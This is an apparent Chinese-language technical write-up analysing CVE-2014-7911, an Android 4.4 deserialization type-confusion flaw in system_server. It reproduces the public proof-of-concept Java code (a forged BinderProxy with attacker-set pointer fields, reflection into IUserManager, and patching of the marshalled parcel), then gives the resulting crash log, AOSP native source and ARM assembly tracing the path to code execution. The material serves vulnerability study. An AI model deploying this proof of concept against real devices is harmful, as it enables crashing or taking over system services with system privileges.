          <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>向<code>system_server</code>传入不可序列化的<code>android.os.BinderProxy</code>对象实例，其成员变量在反序列化时发生类型混淆，由于<code>BinderProxy</code>的<code>finalize()</code>包含native代码，于是在native代码执行时将成员变量强制转换为指针，注意到成员变量是攻击者可控的，攻击者可以控制该指针指向可控的地址空间，最终获得在<code>system_server(uid=1000)</code>中执行代码的权限。<br><strong>Java层分析</strong><br>根据漏洞的<a target="_blank" rel="noopener" href="http://seclists.org/fulldisclosure/2014/Nov/51">PoC</a>:<br>1.构建可序列化的恶意对象<br>创建AAdroid.os.BinderProxy对象，并将其放入Bundle数据中：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bundle b = <span class="keyword">new</span> Bundle();</span><br><span class="line">AAdroid.os.BinderProxy evilProxy = <span class="keyword">new</span> AAdroid.os.BinderProxy()</span><br><span class="line">b.putSerializable(<span class="string">&quot;eatthis&quot;</span>, evilProxy);</span><br></pre></td></tr></table></figure>
<p>注意<code>AAdroid.os.BinderProxy</code>是可序列化的，其成员变量<code>mOrgue</code>就是用于改变程序执行流程的指针。该可序列化对象在传入<code>system_server</code>之前将会被修改为不可序列化的<code>Android.os.BinderProxy</code>对象：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinderProxy</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 注意此处要根据待测的Android版本号设置，我们待测的Android4.4.4 BinderProxy的这两个域为private int，这样才能保证POC访问的地址为我们设置的值0x1337beef</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> mObject = <span class="number">0x1337beef</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> mOrgue = <span class="number">0x1337beef</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.准备传入<code>system_server</code>的数据<br>通过Java反射机制，获得<code>android.os.IUserManager.Stub</code>和<code>android.os.IUserManager.Stub.Proxy</code>的Class对象，最终获得跨进程调用<code>system_server</code>的IBinder接口<code>mRemote</code>，以及调用<code>UserManager.setApplicationRestriction</code>函数的code<code>TRANSACTION_setApplicationRestrictions</code>，为与<code>system_server</code>的跨进程Binder通信作准备。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取android.os.IUserManager.Stub类</span></span><br><span class="line">Class clIUserManager = Class.forName(<span class="string">&quot;android.os.IUserManager&quot;</span>);</span><br><span class="line">Class[] umSubclasses = clIUserManager.getDeclaredClasses();</span><br><span class="line">System.out.println(umSubclasses.length+<span class="string">&quot; inner classes found&quot;</span>);</span><br><span class="line">Class clStub = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">for</span> (Class c: umSubclasses) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;inner class: &quot;</span>+c.getCanonicalName()); <span class="comment">// 和getName没什么不同，只有array和内部类形式不同</span></span><br><span class="line">    <span class="keyword">if</span> (c.getCanonicalName().equals(<span class="string">&quot;android.os.IUserManager.Stub&quot;</span>)) &#123;</span><br><span class="line">        clStub = c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取android.os.IUserManager.Stub类中TRANSACTION_setApplicationRestrictions的值用于transact()</span></span><br><span class="line">Field fTRANSACTION_setApplicationRestrictions =</span><br><span class="line">        clStub.getDeclaredField(<span class="string">&quot;TRANSACTION_setApplicationRestrictions&quot;</span>);</span><br><span class="line">fTRANSACTION_setApplicationRestrictions.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">TRANSACTION_setApplicationRestrictions =</span><br><span class="line">        fTRANSACTION_setApplicationRestrictions.getInt(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取UserManager类对象实例</span></span><br><span class="line">UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);</span><br><span class="line"><span class="comment">// 获取UserManager类中mService成员变量，类型为IUserManager</span></span><br><span class="line">Field fService = UserManager.class.getDeclaredField(<span class="string">&quot;mService&quot;</span>);</span><br><span class="line">fService.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 获取UserManager类对象实例的mService成员变量值</span></span><br><span class="line">Object proxy = fService.get(um);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取android.os.IUserManager.Stub.Proxy类</span></span><br><span class="line">Class[] stSubclasses = clStub.getDeclaredClasses();</span><br><span class="line">System.out.println(stSubclasses.length+<span class="string">&quot; inner classes found&quot;</span>);</span><br><span class="line">clProxy = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">for</span> (Class c: stSubclasses) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;inner class: &quot;</span>+c.getCanonicalName());</span><br><span class="line">    <span class="keyword">if</span> (c.getCanonicalName().equals(<span class="string">&quot;android.os.IUserManager.Stub.Proxy&quot;</span>)) &#123;</span><br><span class="line">        clProxy = c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取android.os.IUserManager.Stub.Proxy类中的mRemote成员变量</span></span><br><span class="line">Field fRemote = clProxy.getDeclaredField(<span class="string">&quot;mRemote&quot;</span>);</span><br><span class="line">fRemote.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 获取IUserManager类对象实例的内部类Stub.Proxy的mRemote成员变量值</span></span><br><span class="line">mRemote = (IBinder) fRemote.get(proxy);</span><br><span class="line"></span><br><span class="line">UserHandle me = android.os.Process.myUserHandle();</span><br><span class="line">setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());</span><br></pre></td></tr></table></figure>
<p>3.向<code>system_server</code>传入不可序列化的Bundle参数<br>调用<code>setApplicationRestrictions</code>这个函数，并传入之前打包了<code>evilproxy</code>的Bundle对象作为参数。将该函数与Android源码中的<a target="_blank" rel="noopener" href="http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/4.4.4_r1/android/os/IUserManager.java#IUserManager.Stub.Proxy.setApplicationRestrictions%28java.lang.String%2Candroid.os.Bundle%2Cint%29">setApplicationRestrictions</a>函数对比，主要区别在于将传入的Bundle对象进行了修改，将可序列化的<code>AAdroid.os.BinderProxy</code>对象修改为不可序列化的<code>android.os.BinderProxy</code>对象，这样就把不可序列化的Bundle数据通过Binder跨进程调用，传入<code>system_server</code>的<code>android.os.UserManager.setApplicationRestrictions()</code>了：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setApplicationRestrictions</span><span class="params">(java.lang.String packageName, android.os.Bundle restrictions, <span class="keyword">int</span></span></span></span><br><span class="line"><span class="function"><span class="params">        userHandle)</span> <span class="keyword">throws</span> android.os.RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    android.os.Parcel _data = android.os.Parcel.obtain();</span><br><span class="line">    android.os.Parcel _reply = android.os.Parcel.obtain();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">        _data.writeString(packageName);</span><br><span class="line">        _data.writeInt(<span class="number">1</span>);</span><br><span class="line">        restrictions.writeToParcel(_data, <span class="number">0</span>);</span><br><span class="line">        _data.writeInt(userHandle);</span><br><span class="line">        <span class="comment">// 修改AAdroid.os.BinderProxy为android.os.BinderProxy</span></span><br><span class="line">        <span class="keyword">byte</span>[] data = _data.marshall();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; <span class="keyword">true</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data[i] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; data[i+<span class="number">1</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; data[i+<span class="number">2</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp; data[i+<span class="number">3</span>] == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">                data[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">                data[i+<span class="number">1</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        _data.recycle();</span><br><span class="line">        _data = Parcel.obtain();</span><br><span class="line">        _data.unmarshall(data, <span class="number">0</span>, data.length);</span><br><span class="line"></span><br><span class="line">        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, <span class="number">0</span>);</span><br><span class="line">        _reply.readException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        _reply.recycle();</span><br><span class="line">        _data.recycle();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将PoC安装到设备上，启动Activity后最小化，触发GC，引起Android系统重启，从Logcat日志中可以看到，<code>system_server</code>执行到了之前设置的BinderProxy对象的0x1337beef这个值，访问不了该内存导致异常：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">I&#x2F;badserial(19536): starting... (v3)</span><br><span class="line">I&#x2F;System.out(19536): 1 inner classes found</span><br><span class="line">I&#x2F;System.out(19536): inner class: android.os.IUserManager.Stub</span><br><span class="line">I&#x2F;System.out(19536): 1 inner classes found</span><br><span class="line">I&#x2F;System.out(19536): inner class: android.os.IUserManager.Stub.Proxy</span><br><span class="line">I&#x2F;badserial(19536): waiting for boom here and over in the system service...</span><br><span class="line">E&#x2F;UserManagerService(17929): Error writing application restrictions list</span><br><span class="line">I&#x2F;Adreno-EGL(19536): &lt;qeglDrvAPI_eglInitialize:320&gt;: EGL 1.4 QUALCOMM Build: I0404c4692afb8623f95c43aeb6d5e13ed4b30ddbDate: 11&#x2F;06&#x2F;13</span><br><span class="line">D&#x2F;OpenGLRenderer(19536): Enabling debug mode 0</span><br><span class="line">I&#x2F;ActivityManager(17929): Displayed net.thejh.badserial&#x2F;.MainActivity: +251ms</span><br><span class="line">D&#x2F;dalvikvm(17929): GC_FOR_ALLOC freed 159K, 5% free 22258K&#x2F;23376K, paused 21ms, total 21ms</span><br><span class="line">I&#x2F;dalvikvm-heap(17929): Grow heap (frag case) to 22.581MB for 856096-byte allocation</span><br><span class="line">D&#x2F;dalvikvm(17929): GC_FOR_ALLOC freed 2K, 5% free 23091K&#x2F;24216K, paused 28ms, total 28ms</span><br><span class="line">F&#x2F;libc    (17929): Fatal signal 11 (SIGSEGV) at 0x1337bef3 (code&#x3D;1), thread 17938 (FinalizerDaemon)</span><br><span class="line">D&#x2F;dalvikvm(17929): GC_FOR_ALLOC freed 148K, 6% free 22944K&#x2F;24216K, paused 25ms, total 25ms</span><br><span class="line">I&#x2F;dalvikvm-heap(17929): Grow heap (frag case) to 23.250MB for 856096-byte allocation</span><br><span class="line">D&#x2F;dalvikvm(17929): GC_FOR_ALLOC freed 0K, 6% free 23780K&#x2F;25056K, paused 22ms, total 22ms</span><br><span class="line">I&#x2F;DEBUG   (  173): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***</span><br><span class="line">I&#x2F;DEBUG   (  173): Build fingerprint: &#39;unknown&#39;</span><br><span class="line">I&#x2F;DEBUG   (  173): Revision: &#39;11&#39;</span><br><span class="line">I&#x2F;DEBUG   (  173): pid: 17929, tid: 17938, name: FinalizerDaemon  &gt;&gt;&gt; system_server &lt;&lt;&lt;</span><br><span class="line">I&#x2F;DEBUG   (  173): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef3</span><br><span class="line">I&#x2F;DEBUG   (  173):     r0 1337beef  r1 401e2551  r2 7469a210  r3 6d4a1cb4</span><br><span class="line">I&#x2F;DEBUG   (  173): AM write failure (32 &#x2F; Broken pipe)</span><br><span class="line">I&#x2F;DEBUG   (  173):     r4 401e2551  r5 1337beef  r6 71cda870  r7 1337beef</span><br><span class="line">I&#x2F;DEBUG   (  173):     r8 1337beef  r9 74a4ff68  sl 7469a220  fp 74b4db24</span><br><span class="line">I&#x2F;DEBUG   (  173):     ip 4021a8c8  sp 74b4dae8  lr 401e14f9  pc 4012f176  cpsr 200f0030</span><br><span class="line">I&#x2F;DEBUG   (  173):     d0  0000010000000001  d1  6d49d43000000000</span><br><span class="line">I&#x2F;DEBUG   (  173):     d2  0000000000000000  d3  0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  173):     d4  0000000000000000  d5  0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  173):     d6  0000000000000000  d7  42c800004bad7074</span><br><span class="line">I&#x2F;DEBUG   (  173):     d8  0000000000000000  d9  0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  173):     d10 0000000000000000  d11 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  173):     d12 0000000000000000  d13 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  173):     d14 0000000000000000  d15 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  173):     d16 0000000000000000  d17 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  173):     d18 0000000000000000  d19 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  173):     d20 0000000000000000  d21 0000004400000044</span><br><span class="line">I&#x2F;DEBUG   (  173):     d22 0000000000000000  d23 0000000000000000</span><br><span class="line">I&#x2F;DEBUG   (  173):     d24 0000000000000000  d25 0002a7600002a760</span><br><span class="line">I&#x2F;DEBUG   (  173):     d26 0707070703030303  d27 0300000004000000</span><br><span class="line">I&#x2F;DEBUG   (  173):     d28 0800000009000000  d29 0001000000010000</span><br><span class="line">I&#x2F;DEBUG   (  173):     d30 010b400001088000  d31 01108000010e0000</span><br><span class="line">I&#x2F;DEBUG   (  173):     scr 80000010</span><br><span class="line">I&#x2F;DEBUG   (  173): </span><br><span class="line">I&#x2F;DEBUG   (  173): backtrace:</span><br><span class="line">I&#x2F;DEBUG   (  173):     #00  pc 0000d176  &#x2F;system&#x2F;lib&#x2F;libutils.so (android::RefBase::decStrong(void const*) const+3)</span><br><span class="line">I&#x2F;DEBUG   (  173):     #01  pc 000704f5  &#x2F;system&#x2F;lib&#x2F;libandroid_runtime.so</span><br><span class="line">I&#x2F;DEBUG   (  173):     #02  pc 0001decc  &#x2F;system&#x2F;lib&#x2F;libdvm.so (dvmPlatformInvoke+112)</span><br><span class="line">I&#x2F;DEBUG   (  173):     #03  pc 0004e423  &#x2F;system&#x2F;lib&#x2F;libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+398)</span><br><span class="line">I&#x2F;DEBUG   (  173):     #04  pc 000272e0  &#x2F;system&#x2F;lib&#x2F;libdvm.so</span><br><span class="line">I&#x2F;DEBUG   (  173):     #05  pc 0002e2a0  &#x2F;system&#x2F;lib&#x2F;libdvm.so (dvmMterpStd(Thread*)+76)</span><br><span class="line">I&#x2F;DEBUG   (  173):     #06  pc 0002b938  &#x2F;system&#x2F;lib&#x2F;libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+184)</span><br><span class="line">I&#x2F;DEBUG   (  173):     #07  pc 00060881  &#x2F;system&#x2F;lib&#x2F;libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, bool, JValue*, std::__va_list)+336)</span><br><span class="line">I&#x2F;DEBUG   (  173):     #08  pc 000608a5  &#x2F;system&#x2F;lib&#x2F;libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+20)</span><br><span class="line">I&#x2F;DEBUG   (  173):     #09  pc 0005558b  &#x2F;system&#x2F;lib&#x2F;libdvm.so</span><br><span class="line">I&#x2F;DEBUG   (  173):     #10  pc 0000d170  &#x2F;system&#x2F;lib&#x2F;libc.so (__thread_entry+72)</span><br><span class="line">I&#x2F;DEBUG   (  173):     #11  pc 0000d308  &#x2F;system&#x2F;lib&#x2F;libc.so (pthread_create+240)</span><br></pre></td></tr></table></figure>
<p><strong>Native层分析</strong><br>如果对象可序列化，则反序列化时，其field引用的对象也会被反序列化。但PoC中<code>android.os.BinderProxy</code>对象实例不可序列化，这样在ObjectInputStream反序列化<code>android.os.BinderProxy</code>对象时，发生了类型混淆(type confusion)，其field被当做随后由native代码处理的指针。这个field就是mOrgue成员变量。<br><code>android.os.BinderProxy</code>的<code>finalize()</code>调用native代码，将mOrgue处理为指针。<br><strong>代码清单</strong> <a target="_blank" rel="noopener" href="http://androidxref.com/4.4_r1/xref/frameworks/base/core/java/android/os/Binder.java#480">/frameworks/base/core/java/android/os/Binder.java</a>  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          destroy();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         <span class="keyword">super</span>.finalize();</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>destroy的native代码：<br><strong>代码清单</strong> <a target="_blank" rel="noopener" href="http://androidxref.com/4.4_r1/xref/frameworks/base/core/jni/android_util_Binder.cpp#1176">/frameworks/base/core/jni/android_util_Binder.cpp</a>  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_BinderProxy_destroy</span><span class="params">(JNIEnv* env, jobject obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    IBinder* b = (IBinder*)</span><br><span class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);</span><br><span class="line">    <span class="comment">// drl就是mOrgue，可以被攻击者控制</span></span><br><span class="line">    DeathRecipientList* drl = (DeathRecipientList*)</span><br><span class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</span><br><span class="line"></span><br><span class="line">    LOGDEATH(<span class="string">&quot;Destroying BinderProxy %p: binder=%p drl=%p\n&quot;</span>, obj, b, drl);</span><br><span class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, <span class="number">0</span>);</span><br><span class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 所以，方法调用使用的this指针可由攻击者控制</span></span><br><span class="line">    drl-&gt;decStrong((<span class="keyword">void</span>*)javaObjectForIBinder);</span><br><span class="line">    b-&gt;decStrong((<span class="keyword">void</span>*)javaObjectForIBinder);</span><br><span class="line">    IPCThreadState::self()-&gt;flushCommands();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是<code>RefBase</code>类中的<code>decStrong</code>方法：<br><strong>代码清单</strong> <a target="_blank" rel="noopener" href="http://androidxref.com/4.4.4_r1/xref/system/core/libutils/RefBase.cpp#337">/system/core/libutils/RefBase.cpp</a>  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RefBase::decStrong</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* id)</span> <span class="keyword">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    weakref_impl* <span class="keyword">const</span> refs = mRefs;</span><br><span class="line">    refs-&gt;removeStrongRef(id);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> PRINT_REFS</span></span><br><span class="line">    ALOGD(<span class="string">&quot;decStrong of %p from %p: cnt=%d\n&quot;</span>, <span class="keyword">this</span>, id, c);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ALOG_ASSERT(c &gt;= <span class="number">1</span>, <span class="string">&quot;decStrong() called on %p too many times&quot;</span>, refs);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 这里最终导致代码执行</span></span><br><span class="line">        refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">        <span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line">            <span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    refs-&gt;decWeak(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>汇编代码分析</strong><br>下面看一下发生异常时最后调用的<code>RefBase::decStrong</code>的汇编代码。将<code>/system/lib/libutils.so</code>下载到本地用IDA打开，查看<code>android::RefBase::decStrong</code>函数。（攻击者能控制<code>r0</code>即<code>this指针</code>）<br><img src="/images/cve-2014-7911/decStrong.png"><br>对r0的使用是在decStrong()的前三行代码中：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weak_impl* <span class="keyword">const</span> refs = mRefs;</span><br><span class="line">refs-&gt;removeStrongRef(id); <span class="comment">// 这个函数为空实现，编译器进行了优化，没有对应的汇编代码</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br></pre></td></tr></table></figure>
<p>对应的汇编代码为：  </p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ldr</span> <span class="built_in">r4</span>, [<span class="built_in">r0</span>, <span class="number">#4</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">r6</span>, <span class="built_in">r1</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span></span><br><span class="line"><span class="keyword">blx</span> &lt;android_atomic_dec()&gt;</span><br></pre></td></tr></table></figure>
<p><code>r0</code>是<code>drl</code>的<code>this</code>指针，<a target="_blank" rel="noopener" href="http://androidxref.com/4.4.4_r1/xref/system/core/include/utils/RefBase.h#168">mRefs</a>是虚函数表之后的第一个私有变量，因此<code>mRefs</code>为<code>r0+4</code>所指向的内容，即<code>r4</code>为<code>mRefs</code>。因为<code>r0+4=0x1337beef+4</code>，0x1337bef3内存不可访问导致异常，即PoC引起系统重启的原因。</p>
<blockquote>
<p>C++的对象所占的存储空间只有虚函数表+成员变量所占的空间，成员函数和普通函数一样，直接调用。</p>
</blockquote>
<p><code>android_atomic_dec()</code>函数被调用，传入参数<code>&amp;refs-&gt;mStrong</code>，mStrong是refs的第一个成员变量，因为<a target="_blank" rel="noopener" href="http://androidxref.com/4.4.4_r1/xref/system/core/libutils/RefBase.cpp#60">weakref_impl</a>没有虚函数，所以没有虚函数表，因此<code>r4</code>指向的内容即为<code>mStrong</code>。<br>接着执行以下代码：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">    refs-&gt;mBase-&gt;onLastStrongRefs(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应的汇编代码：  </p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmp</span> <span class="built_in">r0</span>, <span class="number">#1</span></span><br><span class="line"><span class="keyword">bne</span> loc_d19c</span><br><span class="line"><span class="keyword">ldr</span> <span class="built_in">r0</span>, [<span class="built_in">r4</span>, <span class="number">#8</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="built_in">r6</span></span><br><span class="line"><span class="keyword">ldr</span> <span class="built_in">r3</span>, [<span class="built_in">r0</span>]</span><br><span class="line"><span class="keyword">ldr</span> <span class="built_in">r2</span>, [<span class="built_in">r3</span>, <span class="number">#0xc</span>]</span><br><span class="line"><span class="keyword">blx</span> <span class="built_in">r2</span></span><br></pre></td></tr></table></figure>
